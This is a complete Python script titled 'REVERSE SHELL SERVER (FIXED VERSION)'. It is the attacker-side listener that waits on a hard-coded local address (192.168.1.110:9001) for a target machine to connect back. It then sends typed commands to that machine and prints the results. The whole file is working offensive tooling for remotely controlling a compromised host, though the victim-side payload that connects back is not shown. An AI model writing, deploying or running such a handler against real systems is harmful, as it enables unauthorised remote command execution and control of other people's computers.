#!/usr/bin/env python3
import socket
import sys
import threading
import os

def start_server(host='192.168.1.110', port=9001):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Listening on {host}:{port}")
        print(f"[*] Target should connect to: {host}:{port}")
    except Exception as e:
        print(f"[!] Failed to bind: {e}")
        sys.exit(1)
    
    client_socket, client_addr = server.accept()
    print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")
    
    try:
        # Set socket to non-blocking to check for data
        client_socket.setblocking(True)
        
        while True:
            # Print prompt
            sys.stdout.write("shell> ")
            sys.stdout.flush()
            
            # Get command from user
            command = sys.stdin.readline().strip()
            
            if command.lower() == 'exit' or command.lower() == 'quit':
                client_socket.send(b'exit\n')
                break
            elif command == '':
                continue
            
            # Send command with newline
            client_socket.send((command + '\n').encode())
            
            # Receive and display output
            print("[+] Waiting for response...")
            output_received = False
            
            while True:
                try:
                    # Receive data
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    decoded = data.decode(errors='ignore')
                    sys.stdout.write(decoded)
                    sys.stdout.flush()
                    
                    # If we see the prompt marker or empty response, break
                    if '] $' in decoded or len(data) < 4096:
                        output_received = True
                        break
                        
                except socket.timeout:
                    if output_received:
                        break
                except:
                    break
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Connection closed")

if __name__ == "__main__":
    print("="*50)
    print("REVERSE SHELL SERVER (FIXED VERSION)")
    print("="*50)
    print("Your IP addresses:")
    print("  WiFi:      192.168.1.110  (for other computers on same WiFi)")
    print("  WSL:       172.17.144.1   (for WSL instances)")
    print("="*50)
    
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        host = sys.argv[1]
        port = 9001
    else:
        host = '192.168.1.110'
        port = 9001
    
    print(f"\n[*] Starting server on {host}:{port}")
    print("[*] Press Ctrl+C to stop\n")
    
    start_server(host, port)